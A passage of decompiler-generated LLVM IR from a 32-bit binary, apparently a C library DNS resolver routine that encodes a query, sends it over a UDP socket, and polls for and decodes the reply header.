  %v1_804bf78 = add i32 %v0_804bf75, 8
  %v2_804bf78 = inttoptr i32 %v1_804bf78 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804bf78, align 4
  %v1_804bf7d = add i32 %v0_804bf75, 4
  %v2_804bf7d = inttoptr i32 %v1_804bf7d to i32*
  store i32 134526427, i32* %v2_804bf7d, align 4
  %v1_804bf82 = add i32 %v0_804bf75, 200
  store i32 %v1_804bf82, i32* @eax, align 4
  %v3_804bf89 = inttoptr i32 %v0_804bf75 to i32*
  store i32 %v1_804bf82, i32* %v3_804bf89, align 4
  %v2_804bf8a = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804bf8a, i32* %eax.global-to-local, align 4
  %v0_804bf8f = load i32, i32* @esp, align 4
  %v1_804bf8f = inttoptr i32 %v0_804bf8f to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804bf8f, align 4
  %v1_804bf96 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804bf96, i32* %eax.global-to-local, align 4
  %v0_804bf9b = load i32, i32* @esp, align 4
  %v1_804bf9b = add i32 %v0_804bf9b, 56
  %v2_804bf9b = inttoptr i32 %v1_804bf9b to i32*
  %v3_804bf9b = load i32, i32* %v2_804bf9b, align 4
  store i32 %v3_804bf9b, i32* %edx.global-to-local, align 4
  %v1_804bf9f = add i32 %v0_804bf9b, 268
  %v2_804bf9f = inttoptr i32 %v1_804bf9f to i32*
  %v3_804bf9f = load i32, i32* %v2_804bf9f, align 4
  store i32 %v3_804bf9f, i32* %eax.global-to-local, align 4
  %v2_804bfa6 = mul i32 %v3_804bf9b, 4
  %v3_804bfa6 = add i32 %v3_804bf9f, %v2_804bfa6
  %v4_804bfa6 = inttoptr i32 %v3_804bfa6 to i32*
  %v5_804bfa6 = load i32, i32* %v4_804bfa6, align 4
  store i32 %v5_804bfa6, i32* %edx.global-to-local, align 4
  %v2_804bfa9 = add i32 %v0_804bf9b, 48
  %v3_804bfa9 = inttoptr i32 %v2_804bfa9 to i32*
  store i32 %v5_804bfa6, i32* %v3_804bfa9, align 4
  %v0_804bfad = load i32, i32* @esp, align 4
  %v1_804bfad = add i32 %v0_804bfad, 16
  %v1_804bfb0 = add i32 %v0_804bfad, 52
  %v2_804bfb0 = inttoptr i32 %v1_804bfb0 to i32*
  %v3_804bfb0 = load i32, i32* %v2_804bfb0, align 4
  %v5_804bfb0 = icmp slt i32 %v3_804bfb0, 0
  br i1 %v5_804bfb0, label %dec_label_pc_804bf5f.dec_label_pc_804bff6_crit_edge, label %dec_label_pc_804bfb7

dec_label_pc_804bf5f.dec_label_pc_804bff6_crit_edge: ; preds = %dec_label_pc_804bf5f
  %v0_804bff6.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bff6

dec_label_pc_804bfb7:                             ; preds = %dec_label_pc_804bf5f
  store i32 %v3_804bfb0, i32* %eax.global-to-local, align 4
  %v1_804bfbb = load i32, i32* @global_var_8054998.87, align 8
  %v2_804bfbb = sub i32 %v3_804bfb0, %v1_804bfbb
  %v8_804bfbb = xor i32 %v1_804bfbb, %v3_804bfb0
  %v9_804bfbb = xor i32 %v2_804bfbb, %v3_804bfb0
  %v10_804bfbb = and i32 %v9_804bfbb, %v8_804bfbb
  %v11_804bfbb = icmp slt i32 %v10_804bfbb, 0
  %v13_804bfbb = icmp slt i32 %v2_804bfbb, 0
  %v2_804bfc1 = icmp eq i1 %v13_804bfbb, %v11_804bfbb
  br i1 %v2_804bfc1, label %dec_label_pc_804bff6, label %dec_label_pc_804bfc3

dec_label_pc_804bfc3:                             ; preds = %dec_label_pc_804bfb7
  %v2_804bfc3 = add i32 %v0_804bfad, 12
  %v3_804bfc3 = inttoptr i32 %v2_804bfc3 to i32*
  store i32 %v3_804bfb0, i32* %v3_804bfc3, align 4
  %v1_804bfc4 = add i32 %v0_804bfad, 8
  %v2_804bfc4 = inttoptr i32 %v1_804bfc4 to i32*
  store i32 1025, i32* %v2_804bfc4, align 4
  %v1_804bfc9 = add i32 %v0_804bfad, 4
  %v2_804bfc9 = inttoptr i32 %v1_804bfc9 to i32*
  store i32 ptrtoint (i32* @global_var_80505ca.88 to i32), i32* %v2_804bfc9, align 4
  %v1_804bfce = add i32 %v0_804bfad, 28
  %v2_804bfce = inttoptr i32 %v1_804bfce to i32*
  %v3_804bfce = load i32, i32* %v2_804bfce, align 4
  %v6_804bfce = inttoptr i32 %v0_804bfad to i32*
  store i32 %v3_804bfce, i32* %v6_804bfce, align 4
  %v0_804bfd2 = call i32 @__GI_strncat()
  store i32 %v0_804bfd2, i32* %eax.global-to-local, align 4
  %v0_804bfd7 = load i32, i32* @esp, align 4
  %v1_804bfda = add i32 %v0_804bfd7, 8
  %v2_804bfda = inttoptr i32 %v1_804bfda to i32*
  store i32 1025, i32* %v2_804bfda, align 4
  %v1_804bfdf = add i32 %v0_804bfd7, 52
  %v2_804bfdf = inttoptr i32 %v1_804bfdf to i32*
  %v3_804bfdf = load i32, i32* %v2_804bfdf, align 4
  store i32 %v3_804bfdf, i32* %edx.global-to-local, align 4
  %v1_804bfe3 = mul i32 %v3_804bfdf, 4
  %v2_804bfe3 = add i32 %v1_804bfe3, 134564216
  %v3_804bfe3 = inttoptr i32 %v2_804bfe3 to i32*
  %v4_804bfe3 = load i32, i32* %v3_804bfe3, align 4
  %v6_804bfe3 = add i32 %v0_804bfd7, 4
  %v7_804bfe3 = inttoptr i32 %v6_804bfe3 to i32*
  store i32 %v4_804bfe3, i32* %v7_804bfe3, align 4
  %v1_804bfea = add i32 %v0_804bfd7, 28
  %v2_804bfea = inttoptr i32 %v1_804bfea to i32*
  %v3_804bfea = load i32, i32* %v2_804bfea, align 4
  %v6_804bfea = inttoptr i32 %v0_804bfd7 to i32*
  store i32 %v3_804bfea, i32* %v6_804bfea, align 4
  %v0_804bfee = call i32 @__GI_strncat()
  store i32 %v0_804bfee, i32* %eax.global-to-local, align 4
  %v0_804bff3 = load i32, i32* @esp, align 4
  %v1_804bff3 = add i32 %v0_804bff3, 16
  br label %dec_label_pc_804bff6

dec_label_pc_804bff6:                             ; preds = %dec_label_pc_804bf5f.dec_label_pc_804bff6_crit_edge, %dec_label_pc_804bfb7, %dec_label_pc_804bfc3
  %v1_804bff6 = phi i32 [ %v1_804bfad, %dec_label_pc_804bf5f.dec_label_pc_804bff6_crit_edge ], [ %v1_804bfad, %dec_label_pc_804bfb7 ], [ %v1_804bff3, %dec_label_pc_804bfc3 ]
  %v0_804bff6 = phi i32 [ %v0_804bff6.pre, %dec_label_pc_804bf5f.dec_label_pc_804bff6_crit_edge ], [ %v3_804bfb0, %dec_label_pc_804bfb7 ], [ %v0_804bfee, %dec_label_pc_804bfc3 ]
  %v2_804bff6 = add i32 %v1_804bff6, -4
  %v3_804bff6 = inttoptr i32 %v2_804bff6 to i32*
  store i32 %v0_804bff6, i32* %v3_804bff6, align 4
  %v0_804bff7 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bff7 = add i32 %v1_804bff6, -8
  %v3_804bff7 = inttoptr i32 %v2_804bff7 to i32*
  store i32 %v0_804bff7, i32* %v3_804bff7, align 4
  %v1_804bff8 = add i32 %v1_804bff6, -12
  %v2_804bff8 = inttoptr i32 %v1_804bff8 to i32*
  store i32 1, i32* %v2_804bff8, align 4
  %v1_804bffa = add i32 %v1_804bff6, 184
  store i32 %v1_804bffa, i32* @eax, align 4
  %v2_804c001 = add i32 %v1_804bff6, -16
  %v3_804c001 = inttoptr i32 %v2_804c001 to i32*
  store i32 %v1_804bffa, i32* %v3_804c001, align 4
  %v2_804c002 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c002, i32* %eax.global-to-local, align 4
  %v0_804c007 = load i32, i32* @esp, align 4
  %v1_804c007 = add i32 %v0_804c007, 28
  %v2_804c007 = inttoptr i32 %v1_804c007 to i32*
  %v3_804c007 = load i32, i32* %v2_804c007, align 4
  store i32 %v3_804c007, i32* %eax.global-to-local, align 4
  %v1_804c00b = add i32 %v0_804c007, 260
  %v2_804c00b = inttoptr i32 %v1_804c00b to i32*
  %v3_804c00b = load i32, i32* %v2_804c00b, align 4
  store i32 %v3_804c00b, i32* @edx, align 4
  %v2_804c012 = add i32 %v0_804c007, 216
  %v3_804c012 = inttoptr i32 %v2_804c012 to i32*
  store i32 %v3_804c007, i32* %v3_804c012, align 4
  %v0_804c019 = load i32, i32* @edx, align 4
  %v1_804c019 = load i32, i32* @esp, align 4
  %v2_804c019 = add i32 %v1_804c019, 220
  %v3_804c019 = inttoptr i32 %v2_804c019 to i32*
  store i32 %v0_804c019, i32* %v3_804c019, align 4
  %v0_804c020 = load i32, i32* @esp, align 4
  %v1_804c020 = add i32 %v0_804c020, 224
  %v2_804c020 = inttoptr i32 %v1_804c020 to i32*
  store i32 1, i32* %v2_804c020, align 4
  %v0_804c030 = load i32, i32* @esp, align 4
  %v1_804c033 = load i32, i32* @ebx, align 4
  %v2_804c033 = sub i32 512, %v1_804c033
  %v2_804c035 = add i32 %v0_804c030, 8
  %v3_804c035 = inttoptr i32 %v2_804c035 to i32*
  store i32 %v2_804c033, i32* %v3_804c035, align 4
  %v1_804c036 = load i32, i32* @ebx, align 4
  %v2_804c036 = add i32 %v1_804c036, %v2_804be1e
  %v2_804c03a = add i32 %v0_804c030, 4
  %v3_804c03a = inttoptr i32 %v2_804c03a to i32*
  store i32 %v2_804c036, i32* %v3_804c03a, align 4
  %v1_804c03b = add i32 %v0_804c030, 216
  store i32 %v1_804c03b, i32* @eax, align 4
  %v3_804c042 = inttoptr i32 %v0_804c030 to i32*
  store i32 %v1_804c03b, i32* %v3_804c042, align 4
  %v0_804c043 = call i32 @__encode_question()
  store i32 %v0_804c043, i32* %eax.global-to-local, align 4
  %v0_804c048 = load i32, i32* @esp, align 4
  store i32 %v0_804c043, i32* @esi, align 4
  %v2_804c04d = icmp slt i32 %v0_804c043, 0
  br i1 %v2_804c04d, label %dec_label_pc_804c4b1, label %dec_label_pc_804c055

dec_label_pc_804c055:                             ; preds = %dec_label_pc_804bff6
  %v1_804c055 = add i32 %v0_804c048, 172
  %v2_804c055 = inttoptr i32 %v1_804c055 to i16*
  store i16 2, i16* %v2_804c055, align 2
  %v1_804c05f = load i32, i32* @esp, align 4
  %v2_804c05f = add i32 %v1_804c05f, -4
  %v3_804c05f = inttoptr i32 %v2_804c05f to i32*
  store i32 %v0_804c043, i32* %v3_804c05f, align 4
  %v1_804c060 = add i32 %v1_804c05f, 164
  store i32 %v1_804c060, i32* %eax.global-to-local, align 4
  %v2_804c067 = add i32 %v1_804c05f, -8
  %v3_804c067 = inttoptr i32 %v2_804c067 to i32*
  store i32 %v1_804c060, i32* %v3_804c067, align 4
  %v1_804c068 = add i32 %v1_804c05f, 32
  %v2_804c068 = inttoptr i32 %v1_804c068 to i32*
  %v3_804c068 = load i32, i32* %v2_804c068, align 4
  %v5_804c068 = add i32 %v1_804c05f, -12
  %v6_804c068 = inttoptr i32 %v5_804c068 to i32*
  store i32 %v3_804c068, i32* %v6_804c068, align 4
  %v1_804c06c = add i32 %v1_804c05f, -16
  %v2_804c06c = inttoptr i32 %v1_804c06c to i32*
  store i32 10, i32* %v2_804c06c, align 4
  %v6_804c06e = call i32 @inet_pton(i32 -1, i8* %v5_804c06e, i32 %v3_804bf0b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c06e, i32* %eax.global-to-local, align 4
  %v0_804c073 = load i32, i32* @esp, align 4
  %v1_804c073 = add i32 %v0_804c073, 16
  %tmp47 = icmp slt i32 %v6_804c06e, 1
  br i1 %tmp47, label %dec_label_pc_804c084, label %dec_label_pc_804c07a

dec_label_pc_804c07a:                             ; preds = %dec_label_pc_804c055
  %v1_804c07a = add i32 %v0_804c073, 172
  %v2_804c07a = inttoptr i32 %v1_804c07a to i16*
  store i16 10, i16* %v2_804c07a, align 2
  %v0_804c084.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c084

dec_label_pc_804c084:                             ; preds = %dec_label_pc_804c055, %dec_label_pc_804c07a
  %v0_804c09b = phi i32 [ %v1_804c073, %dec_label_pc_804c055 ], [ %v0_804c084.pre, %dec_label_pc_804c07a ]
  %v1_804c084 = add i32 %v0_804c09b, 156
  %v2_804c084 = inttoptr i32 %v1_804c084 to i16*
  %v3_804c084 = load i16, i16* %v2_804c084, align 2
  %v12_804c084 = icmp eq i16 %v3_804c084, 10
  %v1_804c08d = icmp eq i1 %v12_804c084, false
  %v1_804c09b = add i32 %v0_804c09b, 158
  %v2_804c09b = inttoptr i32 %v1_804c09b to i16*
  store i16 13568, i16* %v2_804c09b, align 2
  %v0_804c0a5 = load i32, i32* @esp, align 4
  br i1 %v1_804c08d, label %dec_label_pc_804c09b, label %dec_label_pc_804c0bb

dec_label_pc_804c09b:                             ; preds = %dec_label_pc_804c084
  %v1_804c0a8 = add i32 %v0_804c0a5, 32
  %v2_804c0a8 = inttoptr i32 %v1_804c0a8 to i32*
  %v3_804c0a8 = load i32, i32* %v2_804c0a8, align 4
  %v5_804c0a8 = add i32 %v0_804c0a5, -16
  %v6_804c0a8 = inttoptr i32 %v5_804c0a8 to i32*
  store i32 %v3_804c0a8, i32* %v6_804c0a8, align 4
  %v1_804c0ac = call i32 @inet_addr(i32 -1)
  store i32 %v1_804c0ac, i32* %eax.global-to-local, align 4
  %v1_804c0b1 = load i32, i32* @esp, align 4
  %v2_804c0b1 = add i32 %v1_804c0b1, 176
  %v3_804c0b1 = inttoptr i32 %v2_804c0b1 to i32*
  store i32 %v1_804c0ac, i32* %v3_804c0b1, align 4
  %v0_804c0b8 = load i32, i32* @esp, align 4
  %v1_804c0b8 = add i32 %v0_804c0b8, 16
  br label %dec_label_pc_804c0bb

dec_label_pc_804c0bb:                             ; preds = %dec_label_pc_804c084, %dec_label_pc_804c09b
  %v1_804c0bb = phi i32 [ %v1_804c0b8, %dec_label_pc_804c09b ], [ %v0_804c0a5, %dec_label_pc_804c084 ]
  %v0_804c0bb = load i32, i32* @ecx, align 4
  %v2_804c0bb = add i32 %v1_804c0bb, -4
  %v3_804c0bb = inttoptr i32 %v2_804c0bb to i32*
  store i32 %v0_804c0bb, i32* %v3_804c0bb, align 4
  %v1_804c0bc = add i32 %v1_804c0bb, -8
  %v2_804c0bc = inttoptr i32 %v1_804c0bc to i32*
  store i32 17, i32* %v2_804c0bc, align 4
  %v1_804c0be = add i32 %v1_804c0bb, -12
  %v2_804c0be = inttoptr i32 %v1_804c0be to i32*
  store i32 2, i32* %v2_804c0be, align 4
  %v1_804c0c0 = add i32 %v1_804c0bb, 156
  %v2_804c0c0 = inttoptr i32 %v1_804c0c0 to i16*
  %v3_804c0c0 = load i16, i16* %v2_804c0c0, align 2
  %v4_804c0c0 = zext i16 %v3_804c0c0 to i32
  store i32 %v4_804c0c0, i32* %eax.global-to-local, align 4
  %v2_804c0c8 = add i32 %v1_804c0bb, -16
  %v3_804c0c8 = inttoptr i32 %v2_804c0c8 to i32*
  store i32 %v4_804c0c0, i32* %v3_804c0c8, align 4
  %v4_804c0c9 = call i32 @socket(i32 -1, i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v4_804c0c9, i32* %eax.global-to-local, align 4
  %v1_804c0ce = load i32, i32* @esp, align 4
  %v2_804c0ce = add i32 %v1_804c0ce, 36
  %v3_804c0ce = inttoptr i32 %v2_804c0ce to i32*
  store i32 %v4_804c0c9, i32* %v3_804c0ce, align 4
  %v0_804c0d2 = load i32, i32* @esp, align 4
  %v1_804c0d2 = add i32 %v0_804c0d2, 16
  %v0_804c0d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0d5 = icmp slt i32 %v0_804c0d5, 0
  br i1 %v2_804c0d5, label %dec_label_pc_804c102, label %dec_label_pc_804c0d9

dec_label_pc_804c0d9:                             ; preds = %dec_label_pc_804c0bb
  %v1_804c0d9 = add i32 %v0_804c0d2, 172
  store i32 %v1_804c0d9, i32* %eax.global-to-local, align 4
  %v0_804c0e0 = load i32, i32* @edx, align 4
  %v2_804c0e0 = add i32 %v0_804c0d2, 12
  %v3_804c0e0 = inttoptr i32 %v2_804c0e0 to i32*
  store i32 %v0_804c0e0, i32* %v3_804c0e0, align 4
  %v1_804c0e1 = add i32 %v0_804c0d2, 8
  %v2_804c0e1 = inttoptr i32 %v1_804c0e1 to i32*
  store i32 28, i32* %v2_804c0e1, align 4
  %v0_804c0e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c0e3 = add i32 %v0_804c0d2, 4
  %v3_804c0e3 = inttoptr i32 %v2_804c0e3 to i32*
  store i32 %v0_804c0e3, i32* %v3_804c0e3, align 4
  %v1_804c0e4 = add i32 %v0_804c0d2, 36
  %v2_804c0e4 = inttoptr i32 %v1_804c0e4 to i32*
  %v3_804c0e4 = load i32, i32* %v2_804c0e4, align 4
  %v6_804c0e4 = inttoptr i32 %v0_804c0d2 to i32*
  store i32 %v3_804c0e4, i32* %v6_804c0e4, align 4
  %v4_804c0e8 = call i32 @__libc_connect(i32 -1, i32 %v15_804beac, i32 %v3_804bf0b)
  store i32 %v4_804c0e8, i32* %eax.global-to-local, align 4
  %v0_804c0ed = load i32, i32* @esp, align 4
  %v2_804c0f0 = icmp slt i32 %v4_804c0e8, 0
  %v1_804c0f2 = icmp eq i1 %v2_804c0f0, false
  br i1 %v1_804c0f2, label %dec_label_pc_804c10b, label %dec_label_pc_804c0f4

dec_label_pc_804c0f4:                             ; preds = %dec_label_pc_804c0d9
  %v1_804c0f4 = call i32 @__errno_location(i32 -1)
  store i32 %v1_804c0f4, i32* %eax.global-to-local, align 4
  %v1_804c0f9 = inttoptr i32 %v1_804c0f4 to i32*
  %v2_804c0f9 = load i32, i32* %v1_804c0f9, align 4
  %v11_804c0f9 = icmp eq i32 %v2_804c0f9, 101
  %v0_804c46b.pre = load i32, i32* @esp, align 4
  br i1 %v11_804c0f9, label %dec_label_pc_804c46b, label %dec_label_pc_804c102

dec_label_pc_804c102:                             ; preds = %dec_label_pc_804c0f4, %dec_label_pc_804c0bb
  %v17_804c102 = phi i32 [ %v1_804c0d2, %dec_label_pc_804c0bb ], [ %v0_804c46b.pre, %dec_label_pc_804c0f4 ]
  %v1_804c102 = add i32 %v17_804c102, 28
  %v2_804c102 = inttoptr i32 %v1_804c102 to i32*
  %v3_804c102 = load i32, i32* %v2_804c102, align 4
  %v4_804c102 = add i32 %v3_804c102, 1
  store i32 %v4_804c102, i32* %v2_804c102, align 4
  br label %dec_label_pc_804c48c.backedge

dec_label_pc_804c10b:                             ; preds = %dec_label_pc_804c0d9
  %v0_804c10b = load i32, i32* @ebx, align 4
  %v1_804c10b = load i32, i32* @esi, align 4
  %v2_804c10b = add i32 %v1_804c10b, %v0_804c10b
  store i32 %v2_804c10b, i32* %eax.global-to-local, align 4
  %v1_804c10e = add i32 %v0_804c0ed, 12
  %v2_804c10e = inttoptr i32 %v1_804c10e to i32*
  store i32 0, i32* %v2_804c10e, align 4
  %v0_804c110 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c110 = add i32 %v0_804c0ed, 8
  %v3_804c110 = inttoptr i32 %v2_804c110 to i32*
  store i32 %v0_804c110, i32* %v3_804c110, align 4
  %v2_804c111 = add i32 %v0_804c0ed, 4
  %v3_804c111 = inttoptr i32 %v2_804c111 to i32*
  store i32 %v2_804be1e, i32* %v3_804c111, align 4
  %v1_804c112 = add i32 %v0_804c0ed, 36
  %v2_804c112 = inttoptr i32 %v1_804c112 to i32*
  %v3_804c112 = load i32, i32* %v2_804c112, align 4
  %v6_804c112 = inttoptr i32 %v0_804c0ed to i32*
  store i32 %v3_804c112, i32* %v6_804c112, align 4
  %v5_804c116 = call i32 @__libc_send(i32 -1, i32 %v15_804beac, i32 %v3_804bf0b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c116, i32* %eax.global-to-local, align 4
  %v0_804c11b = load i32, i32* @esp, align 4
  %v1_804c11b = add i32 %v0_804c11b, 36
  %v2_804c11b = inttoptr i32 %v1_804c11b to i32*
  %v3_804c11b = load i32, i32* %v2_804c11b, align 4
  %v2_804c11f = add i32 %v0_804c11b, 228
  %v3_804c11f = inttoptr i32 %v2_804c11f to i32*
  store i32 %v3_804c11b, i32* %v3_804c11f, align 4
  %v0_804c126 = load i32, i32* @esp, align 4
  %v1_804c126 = add i32 %v0_804c126, 232
  %v2_804c126 = inttoptr i32 %v1_804c126 to i16*
  store i16 1, i16* %v2_804c126, align 2
  %v0_804c130 = load i32, i32* @esp, align 4
  %v1_804c133 = add i32 %v0_804c130, 8
  %v2_804c133 = inttoptr i32 %v1_804c133 to i32*
  store i32 10000, i32* %v2_804c133, align 4
  %v1_804c138 = add i32 %v0_804c130, 4
  %v2_804c138 = inttoptr i32 %v1_804c138 to i32*
  store i32 1, i32* %v2_804c138, align 4
  %v1_804c13a = add i32 %v0_804c130, 228
  store i32 %v1_804c13a, i32* %eax.global-to-local, align 4
  %v3_804c141 = inttoptr i32 %v0_804c130 to i32*
  store i32 %v1_804c13a, i32* %v3_804c141, align 4
  %v0_804c142 = call i32 @__libc_poll()
  store i32 %v0_804c142, i32* %eax.global-to-local, align 4
  %v0_804c147 = load i32, i32* @esp, align 4
  %v1_804c147 = add i32 %v0_804c147, 16
  %tmp48 = icmp slt i32 %v0_804c142, 1
  br i1 %tmp48, label %dec_label_pc_804c46b, label %dec_label_pc_804c152

dec_label_pc_804c152:                             ; preds = %dec_label_pc_804c10b
  %v1_804c152 = add i32 %v0_804c147, 12
  %v2_804c152 = inttoptr i32 %v1_804c152 to i32*
  store i32 0, i32* %v2_804c152, align 4
  %v1_804c154 = add i32 %v0_804c147, 8
  %v2_804c154 = inttoptr i32 %v1_804c154 to i32*
  store i32 512, i32* %v2_804c154, align 4
  %v2_804c159 = add i32 %v0_804c147, 4
  %v3_804c159 = inttoptr i32 %v2_804c159 to i32*
  store i32 %v2_804be1e, i32* %v3_804c159, align 4
  %v1_804c15a = add i32 %v0_804c147, 36
  %v2_804c15a = inttoptr i32 %v1_804c15a to i32*
  %v3_804c15a = load i32, i32* %v2_804c15a, align 4
  %v6_804c15a = inttoptr i32 %v0_804c147 to i32*
  store i32 %v3_804c15a, i32* %v6_804c15a, align 4
  %v5_804c15e = call i32 @__libc_recv(i32 -1, i32 %v15_804beac, i32 %v3_804bf0b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c15e, i32* @eax, align 4
  %v1_804c163 = load i32, i32* @esp, align 4
  %v2_804c163 = add i32 %v1_804c163, 32
  %v3_804c163 = inttoptr i32 %v2_804c163 to i32*
  store i32 %v5_804c15e, i32* %v3_804c163, align 4
  %v0_804c167 = load i32, i32* @esp, align 4
  %v1_804c167 = add i32 %v0_804c167, 16
  %v7_804c16d = icmp sgt i32 %v5_804c15e, 11
  br i1 %v7_804c16d, label %dec_label_pc_804c173, label %dec_label_pc_804c420

dec_label_pc_804c173:                             ; preds = %dec_label_pc_804c152
  %v0_804c173 = load i32, i32* @ebx, align 4
  %v2_804c173 = add i32 %v0_804c167, 12
  %v3_804c173 = inttoptr i32 %v2_804c173 to i32*
  store i32 %v0_804c173, i32* %v3_804c173, align 4
  %v0_804c174 = load i32, i32* @ebx, align 4
  %v2_804c174 = add i32 %v0_804c167, 8
  %v3_804c174 = inttoptr i32 %v2_804c174 to i32*
  store i32 %v0_804c174, i32* %v3_804c174, align 4
  %v1_804c175 = add i32 %v0_804c167, 84
  store i32 %v1_804c175, i32* %eax.global-to-local, align 4
  %v2_804c179 = add i32 %v0_804c167, 4
  %v3_804c179 = inttoptr i32 %v2_804c179 to i32*
  store i32 %v1_804c175, i32* %v3_804c179, align 4
  %v3_804c17a = inttoptr i32 %v0_804c167 to i32*
  store i32 %v2_804be1e, i32* %v3_804c17a, align 4
  %v0_804c17b = call i32 @__decode_header()
  store i32 %v0_804c17b, i32* %eax.global-to-local, align 4
  %v0_804c180 = load i32, i32* @esp, align 4
  %v1_804c180 = add i32 %v0_804c180, 84
  %v2_804c180 = inttoptr i32 %v1_804c180 to i32*
  %v3_804c180 = load i32, i32* %v2_804c180, align 4
  store i32 %v3_804c180, i32* %edx.global-to-local, align 4
  %v2_804c184 = add i32 %v0_804c180, 72
  %v3_804c184 = inttoptr i32 %v2_804c184 to i32*
  store i32 %v3_804c180, i32* %v3_804c184, align 4
  %v0_804c188 = load i32, i32* @esp, align 4
  %v1_804c188 = add i32 %v0_804c188, 16
  %v1_804c18b = add i32 %v0_804c188, 60
  %v2_804c18b = inttoptr i32 %v1_804c18b to i32*
  %v3_804c18b = load i32, i32* %v2_804c18b, align 4
  store i32 %v3_804c18b, i32* @eax, align 4
  %v0_804c18f = load i32, i32* %edx.global-to-local, align 4
  %v12_804c18f = icmp eq i32 %v0_804c18f, %v3_804c18b
  %v1_804c191 = icmp eq i1 %v12_804c18f, false
  br i1 %v1_804c191, label %dec_label_pc_804c420, label %dec_label_pc_804c197

dec_label_pc_804c197:                             ; preds = %dec_label_pc_804c173
  %v1_804c197 = add i32 %v0_804c188, 88
  %v2_804c197 = inttoptr i32 %v1_804c197 to i32*
  %v3_804c197 = load i32, i32* %v2_804c197, align 4
  %v4_804c197 = icmp eq i32 %v3_804c197, 0
  br i1 %v4_804c197, label %dec_label_pc_804c420, label %dec_label_pc_804c1a2

dec_label_pc_804c1a2:                             ; preds = %dec_label_pc_804c197
  %v1_804c1a2 = add i32 %v0_804c188, 112
  %v2_804c1a2 = inttoptr i32 %v1_804c1a2 to i32*
  %v3_804c1a2 = load i32, i32* %v2_804c1a2, align 4
  store i32 %v3_804c1a2, i32* @eax, align 4
  %v9_804c1a6 = icmp eq i32 %v3_804c1a2, 3
  %v1_804c1a9 = icmp eq i1 %v9_804c1a6, false
  br i1 %v1_804c1a9, label %dec_label_pc_804c211, label %dec_label_pc_804c1ab

dec_label_pc_804c1ab:                             ; preds = %dec_label_pc_804c1a2
  %v1_804c1ab = add i32 %v0_804c188, 67
  %v2_804c1ab = inttoptr i32 %v1_804c1ab to i8*
  %v3_804c1ab = load i8, i8* %v2_804c1ab, align 1
  %v4_804c1ab = icmp eq i8 %v3_804c1ab, 0
  %v1_804c1b0 = icmp eq i1 %v4_804c1ab, false
  br i1 %v1_804c1b0, label %dec_label_pc_804c201, label %dec_label_pc_804c1b2

dec_label_pc_804c1b2:                             ; preds = %dec_label_pc_804c1ab
  %v0_804c1b2 = load i32, i32* @ecx, align 4
  %v2_804c1b2 = add i32 %v0_804c188, 12
  %v3_804c1b2 = inttoptr i32 %v2_804c1b2 to i32*
  store i32 %v0_804c1b2, i32* %v3_804c1b2, align 4
  %v1_804c1b3 = add i32 %v0_804c188, 8
  %v2_804c1b3 = inttoptr i32 %v1_804c1b3 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c1b3, align 4
  %v1_804c1b8 = add i32 %v0_804c188, 4
  %v2_804c1b8 = inttoptr i32 %v1_804c1b8 to i32*
  store i32 134526427, i32* %v2_804c1b8, align 4
  %v1_804c1bd = add i32 %v0_804c188, 200
  store i32 %v1_804c1bd, i32* @esi, align 4
  %v3_804c1c4 = inttoptr i32 %v0_804c188 to i32*
  store i32 %v1_804c1bd, i32* %v3_804c1c4, align 4
  %v2_804c1c5 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c1c5, i32* %eax.global-to-local, align 4
  %v0_804c1ca = load i32, i32* @esp, align 4
  %v1_804c1ca = inttoptr i32 %v0_804c1ca to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c1ca, align 4
  %v1_804c1d1 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c1d1, i32* %eax.global-to-local, align 4
  %v0_804c1d6 = load i32, i32* @esp, align 4
  %v1_804c1d6 = inttoptr i32 %v0_804c1d6 to i32*
  %v2_804c1d6 = load i32, i32* %v1_804c1d6, align 4
  store i32 %v2_804c1d6, i32* @eax, align 4
  %v3_804c1d6 = add i32 %v0_804c1d6, 4
  %v1_804c1d7 = inttoptr i32 %v3_804c1d6 to i32*
  %v2_804c1d7 = load i32, i32* %v1_804c1d7, align 4
  store i32 %v2_804c1d7, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c1d7, align 4
  %v0_804c1da = load i32, i32* @esi, align 4
  store i32 %v0_804c1da, i32* %v1_804c1d6, align 4
  %v0_804c1db = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c1db, i32* %ebx.global-to-local, align 4
  %v2_804c1e1 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804beac)
  store i32 %v2_804c1e1, i32* %eax.global-to-local, align 4
  %v0_804c1e6 = load i32, i32* @esp, align 4
  %v1_804c1e9 = add i32 %v0_804c1db, -1
  store i32 %v1_804c1e9, i32* @ebx, align 4
  %v1_804c1ea = add i32 %v0_804c1e6, 52
  %v2_804c1ea = inttoptr i32 %v1_804c1ea to i32*
  %v3_804c1ea = load i32, i32* %v2_804c1ea, align 4
  %v5_804c1ea = sub i32 %v3_804c1ea, %v1_804c1e9
  %v11_804c1ea = xor i32 %v3_804c1ea, %v1_804c1e9
  %v12_804c1ea = xor i32 %v5_804c1ea, %v3_804c1ea
  %v13_804c1ea = and i32 %v12_804c1ea, %v11_804c1ea
  %v14_804c1ea = icmp slt i32 %v13_804c1ea, 0
  %v16_804c1ea = icmp slt i32 %v5_804c1ea, 0
  %v2_804c1ee = icmp eq i1 %v16_804c1ea, %v14_804c1ea
  br i1 %v2_804c1ee, label %dec_label_pc_804c201, label %dec_label_pc_804c1f0

dec_label_pc_804c1f0:                             ; preds = %dec_label_pc_804c1b2
